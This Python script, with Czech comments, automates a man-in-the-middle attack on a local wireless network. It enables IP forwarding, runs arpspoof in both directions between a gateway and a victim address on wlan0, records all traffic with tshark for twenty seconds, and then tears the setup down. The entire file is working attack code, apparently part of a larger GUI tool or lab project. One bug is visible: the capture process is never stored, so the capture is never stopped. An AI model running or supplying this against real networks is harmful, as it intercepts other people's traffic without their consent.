import subprocess
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import *
from tkinter import filedialog
import re
from threading import Thread
import time
import signal
import os
import csv
import pyshark
import scapy

#import pandas as pd

arpspoof_cl_process = None
arpspoof_ap_process = None
capturing_process = None

output_traffic = "full_traffic.pcap"
# Uklidím případný soubor output po předešlém spuštění
if os.path.isfile(output_traffic):
    os.remove(output_traffic)

# Globální proměnná s názvem interface pro monitorovací mód
#interface = ""

# ========================================================================================================================
def start_forwarding():
    try:
        # Zapne přeposílání paketů
        command = "sysctl net.ipv4.ip_forward=1"
        print("COMMAND: " + command)

        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
        print(f"Přeposílání paketů bylo úspěšně zapnuto.")

    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání přeposílání paketů: {e}")
# ========================================================================================================================
def stop_forwarding():
    try:
        # Zapne přeposílání paketů
        command = "sysctl net.ipv4.ip_forward=0"
        print("COMMAND: " + command)

        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
        print(f"Přeposílání paketů bylo úspěšně vypnuto.")

    except subprocess.CalledProcessError as e:

        print(f"Chyba při vypínání přeposílání paketů: {e}")
# ========================================================================================================================
def find_ip_by_mac(mac_address, interface):
    try:
        # Run arp-scan on the specified interface
        result = subprocess.check_output(['sudo', 'arp-scan', '--interface', interface, '--localnet'], text=True)
        
        # Iterate through each line of the output
        for line in result.splitlines():
            # Check if the current line contains the MAC address
            if mac_address.lower() in line.lower():
                # Extract and return the IP address
                ip_address = line.split()[0]
                return ip_address
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

# ========================================================================================================================
def start_arp_spoofing():
    try:

        command = "sudo arpspoof -i wlan0 -t 192.168.105.1 192.168.105.138 "
        print("COMMAND: " + command)
        global arpspoof_cl_process 
        arpspoof_cl_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        command = "sudo arpspoof -i wlan0 -t 192.168.105.138 192.168.105.1"
        print("COMMAND: " + command)
        global arpspoof_ap_process 
        arpspoof_ap_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        print(f"ARP spoofing byl úspěšně spuštěn.")
    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání ARP spoofingu: {e}")
# ========================================================================================================================
def stop_arp_spoofing():
    global arpspoof_cl_process 
    global arpspoof_ap_process

    if arpspoof_cl_process:
        os.killpg(os.getpgid(arpspoof_cl_process.pid), signal.SIGTERM)
        print("  -- Process arpspoofing pro klienta byl zastaven.")

    if arpspoof_ap_process:
        os.killpg(os.getpgid(arpspoof_ap_process.pid), signal.SIGTERM)
        print("  -- Process arpspoofing pro access point byl zastaven.")

   
    print(f"ARP spoofing byl úspěšně zastaven.")

# ========================================================================================================================
def start_capturing():
    try:
        # Zapne zachytávání všech paketů
        #global output_traffic
        #global interface
        #traffic_capture = pyshark.LiveCapture(interface='wlan0')
        #print("COMMAND: pyshark.FileCapture")
        #tohle do samostatnýho threadu:
                #traffic_capture = pyshark.FileCapture(interface=interface, output_file=output_traffic)    
        interface ="wlan0"
        command = f"tshark -i {interface} -w {output_traffic}"
        print("COMMAND: " + command)

        global capturing_process
        #capturing_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        capturing_process = None
        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        #capturing_process = subprocess.run(command)
    except subprocess.CalledProcessError as e:
        print(f"Chyba při zapínání zachytávání paketů: {e}")
# ========================================================================================================================
def stop_capturing():
    global capturing_process
    
    if capturing_process:
        os.killpg(os.getpgid(capturing_process.pid), signal.SIGTERM)
        print("  -- Process Zachytávání trafiku byl zastaven.")




# ========================================================================================================================================
# Tab "Man-in-the-middle" ================================================================================================================
start_forwarding()
start_arp_spoofing()
start_capturing()
time.sleep(20)
stop_capturing()
stop_arp_spoofing()
stop_forwarding()


